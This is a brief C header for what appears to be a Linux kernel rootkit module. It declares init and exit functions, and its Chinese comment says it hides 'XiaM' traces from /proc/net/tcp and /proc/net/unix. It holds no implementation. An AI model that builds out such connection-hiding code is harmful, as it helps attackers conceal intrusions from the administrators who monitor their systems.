/* SPDX-License-Identifier: GPL-2.0-or-later */
#ifndef _HIDE_NET_H
#define _HIDE_NET_H

/* 隐藏 /proc/net/tcp 和 /proc/net/unix 中的 XiaM 特征 */

int hide_net_init(void);
void hide_net_exit(void);

#endif /* _HIDE_NET_H */
